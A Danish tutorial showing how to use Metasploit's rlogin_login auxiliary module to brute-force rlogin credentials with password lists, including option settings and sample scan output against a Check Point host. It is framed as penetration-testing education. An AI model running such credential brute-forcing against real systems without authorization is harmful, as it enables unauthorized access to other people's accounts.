# Metasploit
## 1: Start metasploit konsollen
```bash
msfconsole
```

## 2: Find og vælg et modul
I dette eksempel har jeg valgt at bruge en auxiliary (rlogin)
```bash
search auxiliary/scanner
```
Her kan man se et modul helt i bunden, som har følgende beskrivelse
```console
Matching Modules
================

   #    Name                                                     Disclosure Date  Rank    Check  Description
   -    ----                                                     ---------------  ----    -----  -----------
   0    auxiliary/scanner/http/netalertx_file_read               2025-01-30       normal  No     NetAlertX File Read Vulnerability
   ...  ...                                                      ...              ...     ...    ...
   745  auxiliary/scanner/rservices/rlogin_login                                  normal  No     rlogin Authentication Scanner
   746  auxiliary/scanner/rservices/rsh_login                                     normal  No     rsh Authentication Scanner

Interact with a module by name or index. For example info 746, use 746 or use auxiliary/scanner/rservices/rsh_login

msf > use auxiliary/scanner/rservices/rlogin_login
msf auxiliary(scanner/rservices/rlogin_login) >
```
Man vælger modulet ved denne kommando. Hvis det lykkes vil du få en confirmation og msf > vil skifte navn til det valgte modul
```bash
use auxiliary/scanner/rservices/rlogin_login
```
```console
msf auxiliary(scanner/rservices/rlogin_login) >
```

## 3: Konfigurer indstillinger
Før vi kan angribe target, skal vi først konfigurer indstillingerne for modulet ved at skrive enten "Options" eller "Show Options"
```bash
show options
```
Her kan man vælge hvilke ordlister man ønsker at bruge, da dette modul virker på ordlister og såvel som at ændre på modul indstillinger der eksempelvis gør at hvert brugernavn bliver brugt med hvert kodeord i stedet for første brugernavn kun bliver brugt til det første kodeord og meget andet. Konfigurer til dine behov.
```console
Module options (auxiliary/scanner/rservices/rlogin_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   CreateSession     true             no        Create a new session for every successful login
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   ...
```
Du ændrer de forskellige Options ved at skrive "set" eller "unset" for at vende tilbage til default. Husk at set korrekt, eksempelvis hvis du skal set en ordliste, skal du bruge en sti til ordliste filen. Hvis nogen skal slås til eller fra skriver man set (option) true/false. 
```console
msf auxiliary(scanner/rservices/rlogin_login) > set PASS_FILE passwords.txt
PASS_FILE => passwords.txt
```
```console
msf auxiliary(scanner/rservices/rlogin_login) > set ANONYMOUS_LOGIN true
ANONYMOUS_LOGIN => true
```

## 4: Kør modulet
Efter alle options er indstillet som øsnket efter behov, kan man nu starte scanningen ved
```bash
run
```
eller hvis target ikke er blevet indstillet
```bash
run (target)
```
I dette tilfælde får vi dette output
```console
[*] Starting rlogin sweep
[-] rlogin - Attempting: 'admin':'admin' from 'root'
[-] Prompt: Check Point FireWall-1 authenticated RLogin server running on bulldog
[-] Result: ***** Access denied - wrong user name or password
[-] rlogin - Attempting: 'admin':'password' from 'daemon'
[-] Unable to connect: The destination is invalid:
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/rservices/rlogin_login) >
```
Det kan ses i dette eksempel, at vi heldigvis ikke får hul igennem med den "default_username" og "default_password" ordlister vi har brugt. Således kan man bruge Metasploit til at penteste systemer. 


